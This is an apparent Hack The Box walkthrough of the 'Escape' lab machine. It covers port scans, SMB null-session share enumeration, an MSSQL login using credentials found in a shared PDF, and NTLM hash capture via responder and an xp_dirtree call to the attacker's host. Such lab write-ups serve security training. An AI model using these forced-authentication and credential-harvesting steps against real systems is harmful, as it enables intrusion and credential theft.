# Hack the Box - Escape

```shell
root@kali# rustscan -b 1000 -u 5000 -r 0-65535 -a 10.10.11.202 -- -Pn
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.202:53
Open 10.10.11.202:88
Open 10.10.11.202:135
Open 10.10.11.202:139
Open 10.10.11.202:389
Open 10.10.11.202:445
Open 10.10.11.202:464
Open 10.10.11.202:593
Open 10.10.11.202:636
Open 10.10.11.202:5985
Open 10.10.11.202:9389
Open 10.10.11.202:49667
Open 10.10.11.202:49687
Open 10.10.11.202:49688
Open 10.10.11.202:49709
Open 10.10.11.202:49717
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -Pn" on ip 10.10.11.202
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-29 12:29 IST
Initiating Parallel DNS resolution of 1 host. at 12:29
Completed Parallel DNS resolution of 1 host. at 12:29, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:29
Scanning 10.10.11.202 [16 ports]
Discovered open port 53/tcp on 10.10.11.202
Discovered open port 135/tcp on 10.10.11.202
Discovered open port 139/tcp on 10.10.11.202
Discovered open port 445/tcp on 10.10.11.202
Discovered open port 593/tcp on 10.10.11.202
Discovered open port 49717/tcp on 10.10.11.202
Discovered open port 389/tcp on 10.10.11.202
Discovered open port 88/tcp on 10.10.11.202
Discovered open port 464/tcp on 10.10.11.202
Discovered open port 49709/tcp on 10.10.11.202
Discovered open port 49687/tcp on 10.10.11.202
Discovered open port 49688/tcp on 10.10.11.202
Discovered open port 49667/tcp on 10.10.11.202
Discovered open port 636/tcp on 10.10.11.202
Discovered open port 9389/tcp on 10.10.11.202
Discovered open port 5985/tcp on 10.10.11.202
Completed Connect Scan at 12:29, 0.29s elapsed (16 total ports)
Nmap scan report for 10.10.11.202
Host is up, received user-set (0.14s latency).
Scanned at 2023-09-29 12:29:19 IST for 0s

PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack
88/tcp    open  kerberos-sec   syn-ack
135/tcp   open  msrpc          syn-ack
139/tcp   open  netbios-ssn    syn-ack
389/tcp   open  ldap           syn-ack
445/tcp   open  microsoft-ds   syn-ack
464/tcp   open  kpasswd5       syn-ack
593/tcp   open  http-rpc-epmap syn-ack
636/tcp   open  ldapssl        syn-ack
5985/tcp  open  wsman          syn-ack
9389/tcp  open  adws           syn-ack
49667/tcp open  unknown        syn-ack
49687/tcp open  unknown        syn-ack
49688/tcp open  unknown        syn-ack
49709/tcp open  unknown        syn-ack
49717/tcp open  unknown        syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
```

Open Ports: 53,88,135,139,389,445,464,593,636,5985,9389,49248,49667,49687,49688,49709,49717

```shell
root@kali# rustscan -u 5000 -a 10.10.11.202 -p 53,88,135,139,389,445,464,593,636,5985,9389,49248,49667,49687,49688,49709,49717 -- -Pn -sC -sV
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.202:88
Open 10.10.11.202:53
Open 10.10.11.202:389
Open 10.10.11.202:139
Open 10.10.11.202:135
Open 10.10.11.202:636
Open 10.10.11.202:464
Open 10.10.11.202:9389
Open 10.10.11.202:445
Open 10.10.11.202:593
Open 10.10.11.202:5985
Open 10.10.11.202:49248
Open 10.10.11.202:49687
Open 10.10.11.202:49667
Open 10.10.11.202:49688
Open 10.10.11.202:49709
Open 10.10.11.202:49717
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -Pn -sC -sV" on ip 10.10.11.202
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-29 12:38 IST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:38
Completed NSE at 12:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:38
Completed NSE at 12:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:38
Completed NSE at 12:38, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:38
Completed Parallel DNS resolution of 1 host. at 12:38, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:38
Scanning 10.10.11.202 [17 ports]
Discovered open port 139/tcp on 10.10.11.202
Discovered open port 135/tcp on 10.10.11.202
Discovered open port 53/tcp on 10.10.11.202
Discovered open port 445/tcp on 10.10.11.202
Discovered open port 49687/tcp on 10.10.11.202
Discovered open port 49248/tcp on 10.10.11.202
Discovered open port 636/tcp on 10.10.11.202
Discovered open port 88/tcp on 10.10.11.202
Discovered open port 49717/tcp on 10.10.11.202
Discovered open port 9389/tcp on 10.10.11.202
Discovered open port 5985/tcp on 10.10.11.202
Discovered open port 49667/tcp on 10.10.11.202
Discovered open port 464/tcp on 10.10.11.202
Discovered open port 389/tcp on 10.10.11.202
Discovered open port 49688/tcp on 10.10.11.202
Discovered open port 593/tcp on 10.10.11.202
Discovered open port 49709/tcp on 10.10.11.202
Completed Connect Scan at 12:38, 0.29s elapsed (17 total ports)
Initiating Service scan at 12:38
Scanning 17 services on 10.10.11.202
Completed Service scan at 12:39, 55.98s elapsed (17 services on 1 host)
NSE: Script scanning 10.10.11.202.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:39
NSE Timing: About 99.96% done; ETC: 12:40 (0:00:00 remaining)
Completed NSE at 12:40, 40.09s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:40
Completed NSE at 12:40, 1.13s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:40
Completed NSE at 12:40, 0.00s elapsed
Nmap scan report for 10.10.11.202
Host is up, received user-set (0.14s latency).
Scanned at 2023-09-29 12:38:54 IST for 98s

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-09-29 15:09:02Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f:7f54:b2ed:ff74:708d:1a6d:df34:b9bd
| SHA-1: 742a:b452:2191:3317:6739:5039:db9b:3b2e:27b6:f7fa
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITHgAAAASQUnv8kTh0LwAAAAAABDANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE4MjEyMDM1WhcNMjMxMTE4
| MjEyMDM1WjAYMRYwFAYDVQQDEw1kYy5zZXF1ZWwuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAppJ4qi7+By/k2Yjy1J83ZJ1z/spO74W9tUZwPfgv
| mDj0KBf4FR3IN9GtLgjVX6CHwTtez8kdl2tc58HB8o9B4myaKjzhKmRX10eYaSe0
| icT5fZUoLDxCUz4ou/fbtM3AUtPEXKBokuBni+x8wM2XpUXRznXWPL3wqQFsB91p
| Mub1Zz/Kmey3EZgxT43PdPY4CZJwDvpIUeXg293HG1r/yMqX31AZ4ePLeNYDpYzo
| fKg4C5K/2maN+wTTZ1t6ARiqAWBQrxFRTH6vTOoT6NF+6HxALXFxxWw/7OrfJ4Wl
| 5Y5ui1H5vWS1ernVPE98aiJje3B5mTsPczw7oKBFEdszRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUIuJgX6Ee95CeVip7
| lbtMDt5sWIcwHwYDVR0jBBgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2VxdWVsLURDLUNBLENOPWRj
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNlcXVlbCxEQz1odGI/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NOPXNl
| cXVlbC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1ZWwsREM9aHRiP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDkGA1UdEQQyMDCgHwYJKwYBBAGCNxkBoBIEENIKdyhMrBRIsqTPzAbls0uCDWRj
| LnNlcXVlbC5odGIwDQYJKoZIhvcNAQELBQADggEBAJLkSygHvC+jUd6MD07n6vN+
| /VbEboj++2qaUZjrXcZJf24t85ETixEmwP+xjsvuw8ivxV+OrPEZsipJ7cwPjxed
| RcwjpeXyq7+FszZR9Q/QwgMGhwpWCLVg/e7I9HiEORu/acH5AIOsXp0oTB7N9rMC
| frCIs3KAU990pyV+JhzfseVjJiiXmKeivvvLJuknwYmulanleOZSWlljckXWz29r
| nKQfODM1CJN7sWoNGN+H3hVlQzJihM8qm9NO1PLinpUkPAq5JovsOvr75ZOvIgSb
| Ea0hY7tIoQdoEwbZMSMCQDdOSlpI6fjJge10vCZp/YUgSL8bgtzttCGYN92LKrQ=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-09-29T15:10:33+00:00; +8h00m02s from scanner time.
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f:7f54:b2ed:ff74:708d:1a6d:df34:b9bd
| SHA-1: 742a:b452:2191:3317:6739:5039:db9b:3b2e:27b6:f7fa
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITHgAAAASQUnv8kTh0LwAAAAAABDANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE4MjEyMDM1WhcNMjMxMTE4
| MjEyMDM1WjAYMRYwFAYDVQQDEw1kYy5zZXF1ZWwuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAppJ4qi7+By/k2Yjy1J83ZJ1z/spO74W9tUZwPfgv
| mDj0KBf4FR3IN9GtLgjVX6CHwTtez8kdl2tc58HB8o9B4myaKjzhKmRX10eYaSe0
| icT5fZUoLDxCUz4ou/fbtM3AUtPEXKBokuBni+x8wM2XpUXRznXWPL3wqQFsB91p
| Mub1Zz/Kmey3EZgxT43PdPY4CZJwDvpIUeXg293HG1r/yMqX31AZ4ePLeNYDpYzo
| fKg4C5K/2maN+wTTZ1t6ARiqAWBQrxFRTH6vTOoT6NF+6HxALXFxxWw/7OrfJ4Wl
| 5Y5ui1H5vWS1ernVPE98aiJje3B5mTsPczw7oKBFEdszRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUIuJgX6Ee95CeVip7
| lbtMDt5sWIcwHwYDVR0jBBgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2VxdWVsLURDLUNBLENOPWRj
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNlcXVlbCxEQz1odGI/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG9BggrBgEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NOPXNl
| cXVlbC1EQy1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1ZWwsREM9aHRiP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDkGA1UdEQQyMDCgHwYJKwYBBAGCNxkBoBIEENIKdyhMrBRIsqTPzAbls0uCDWRj
| LnNlcXVlbC5odGIwDQYJKoZIhvcNAQELBQADggEBAJLkSygHvC+jUd6MD07n6vN+
| /VbEboj++2qaUZjrXcZJf24t85ETixEmwP+xjsvuw8ivxV+OrPEZsipJ7cwPjxed
| RcwjpeXyq7+FszZR9Q/QwgMGhwpWCLVg/e7I9HiEORu/acH5AIOsXp0oTB7N9rMC
| frCIs3KAU990pyV+JhzfseVjJiiXmKeivvvLJuknwYmulanleOZSWlljckXWz29r
| nKQfODM1CJN7sWoNGN+H3hVlQzJihM8qm9NO1PLinpUkPAq5JovsOvr75ZOvIgSb
| Ea0hY7tIoQdoEwbZMSMCQDdOSlpI6fjJge10vCZp/YUgSL8bgtzttCGYN92LKrQ=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-09-29T15:10:33+00:00; +8h00m02s from scanner time.
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49248/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49687/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         syn-ack Microsoft Windows RPC
49709/tcp open  msrpc         syn-ack Microsoft Windows RPC
49717/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 63970/tcp): CLEAN (Timeout)
|   Check 2 (port 32262/tcp): CLEAN (Timeout)
|   Check 3 (port 50586/udp): CLEAN (Timeout)
|   Check 4 (port 39203/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 8h00m01s, deviation: 0s, median: 8h00m01s
| smb2-time: 
|   date: 2023-09-29T15:09:57
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:40
Completed NSE at 12:40, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:40
Completed NSE at 12:40, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:40
Completed NSE at 12:40, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.92 seconds
```

```shell
root@kali# echo "10.10.11.202    sequel.htb dc.sequel.htb" | sudo tee -a /etc/hosts
```

Fetch SSL Certificvate from LDAPS
```shell
root@kali# openssl s_client -showcerts -connect 10.10.11.202:3269 | openssl x509 -noout -text
```
```shell
Can't use SSL_get_servername
depth=0 CN = dc.sequel.htb
verify error:num=20:unable to get local issuer certificate
verify return:1
depth=0 CN = dc.sequel.htb
verify error:num=21:unable to verify the first certificate
verify return:1
depth=0 CN = dc.sequel.htb
verify return:1
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            1e:00:00:00:04:90:52:7b:fc:91:38:74:2f:00:00:00:00:00:04
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: DC = htb, DC = sequel, CN = sequel-DC-CA
        Validity
            Not Before: Nov 18 21:20:35 2022 GMT
            Not After : Nov 18 21:20:35 2023 GMT
        Subject: CN = dc.sequel.htb
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:a6:92:78:aa:2e:fe:07:2f:e4:d9:88:f2:d4:9f:
                    37:64:9d:73:fe:ca:4e:ef:85:bd:b5:46:70:3d:f8:
                    2f:98:38:f4:28:17:f8:15:1d:c8:37:d1:ad:2e:08:
                    d5:5f:a0:87:c1:3b:5e:cf:c9:1d:97:6b:5c:e7:c1:
                    c1:f2:8f:41:e2:6c:9a:2a:3c:e1:2a:64:57:d7:47:
                    98:69:27:b4:89:c4:f9:7d:95:28:2c:3c:42:53:3e:
                    28:bb:f7:db:b4:cd:c0:52:d3:c4:5c:a0:68:92:e0:
                    67:8b:ec:7c:c0:cd:97:a5:45:d1:ce:75:d6:3c:bd:
                    f0:a9:01:6c:07:dd:69:32:e6:f5:67:3f:ca:99:ec:
                    b7:11:98:31:4f:8d:cf:74:f6:38:09:92:70:0e:fa:
                    48:51:e5:e0:db:dd:c7:1b:5a:ff:c8:ca:97:df:50:
                    19:e1:e3:cb:78:d6:03:a5:8c:e8:7c:a8:38:0b:92:
                    bf:da:66:8d:fb:04:d3:67:5b:7a:01:18:aa:01:60:
                    50:af:11:51:4c:7e:af:4c:ea:13:e8:d1:7e:e8:7c:
                    40:2d:71:71:c5:6c:3f:ec:ea:df:27:85:a5:e5:8e:
                    6e:8b:51:f9:bd:64:b5:7a:b9:d5:3c:4f:7c:6a:22:
                    63:7b:70:79:99:3b:0f:73:3c:3b:a0:a0:45:11:db:
                    33:45
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            1.3.6.1.4.1.311.20.2: 
                . .D.o.m.a.i.n.C.o.n.t.r.o.l.l.e.r
            X509v3 Extended Key Usage: 
                TLS Web Client Authentication, TLS Web Server Authentication
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            S/MIME Capabilities: 
......0...`.H.e...*0...`.H.e...-0...`.H.e....0...`.H.e....0...+....0
..*.H..
            X509v3 Subject Key Identifier: 
                22:E2:60:5F:A1:1E:F7:90:9E:56:2A:7B:95:BB:4C:0E:DE:6C:58:87
            X509v3 Authority Key Identifier: 
                62:9F:32:A3:A0:F0:38:20:D4:60:C0:CD:6D:C5:FA:51:30:5E:C3:15
            X509v3 CRL Distribution Points: 
                Full Name:
                  URI:ldap:///CN=sequel-DC-CA,CN=dc,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=sequel,DC=htb?certificateRevocationList?base?objectClass=cRLDistributionPoint
            Authority Information Access: 
                CA Issuers - URI:ldap:///CN=sequel-DC-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=sequel,DC=htb?cACertificate?base?objectClass=certificationAuthority
            X509v3 Subject Alternative Name: 
                othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        92:e4:4b:28:07:bc:2f:a3:51:de:8c:0f:4e:e7:ea:f3:7e:fd:
        56:c4:6e:88:fe:fb:6a:9a:51:98:eb:5d:c6:49:7f:6e:2d:f3:
        91:13:8b:11:26:c0:ff:b1:8e:cb:ee:c3:c8:af:c5:5f:8e:ac:
        f1:19:b2:2a:49:ed:cc:0f:8f:17:9d:45:cc:23:a5:e5:f2:ab:
        bf:85:b3:36:51:f5:0f:d0:c2:03:06:87:0a:56:08:b5:60:fd:
        ee:c8:f4:78:84:39:1b:bf:69:c1:f9:00:83:ac:5e:9d:28:4c:
        1e:cd:f6:b3:02:7e:b0:88:b3:72:80:53:df:74:a7:25:7e:26:
        1c:df:b1:e5:63:26:28:97:98:a7:a2:be:fb:cb:26:e9:27:c1:
        89:ae:95:a9:e5:78:e6:52:5a:59:63:72:45:d6:cf:6f:6b:9c:
        a4:1f:38:33:35:08:93:7b:b1:6a:0d:18:df:87:de:15:65:43:
        32:62:84:cf:2a:9b:d3:4e:d4:f2:e2:9e:95:24:3c:0a:b9:26:
        8b:ec:3a:fa:fb:e5:93:af:22:04:9b:11:ad:21:63:bb:48:a1:
        07:68:13:06:d9:31:23:02:40:37:4e:4a:5a:48:e9:f8:c9:81:
        ed:74:bc:26:69:fd:85:20:48:bf:1b:82:dc:ed:b4:21:98:37:
        dd:8b:2a:b4
```

SMB
- OS Version
```shell
root@kali# crackmapexec smb 10.10.11.202
```
```shell
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
```

- Enumerate Shares
```shell
root@kali# crackmapexec smb 10.10.11.202 --shares
```
```shell
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
```

- Enumerate Shares with Null Session Authentication
```shell
root@kali# crackmapexec smb 10.10.11.202 -u 'DoesNotExist' -p '' --shares
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0a7b782e-fd9c-4a23-989c-92e9afc5fcfa)

- Public Share Contents
```shell
root@kali# smbclinet //10.10.11.202/Public -N
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c1b21bf3-c81c-405c-bafa-7ba3b8ac888c)

```shell
root@kali# open SQL\ Server\ Procedures.pdf
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/400a083f-4e00-4655-bd7a-ab12d250697f)

MSSQL
```shell
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
```

On every SQL Server instance there are default system databases:
- master - keeps the information for an instance of SQL Server.
- msdb - used by SQL Server Agent.
- model - template database copied for each new database.
- resource - read only database that keeps system objects that are visible in every database on the server in sys schema.
- tempdb - keeps temporary objects for SQL queries.

```shell
root@kali# impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/fcc30b01-8914-4d83-b288-42971e39ffad)

NTLM Hash
```shell
root@kali# responder -I tun0
```
```shell
SQL> EXEC xp_dirtree '\\10.10.14.10\share', 1, 1
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/8b855968-0e44-4ea9-9171-f005e5f089fc)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2f3d8fab-2b5f-4a46-9a11-c3f0e1251269)

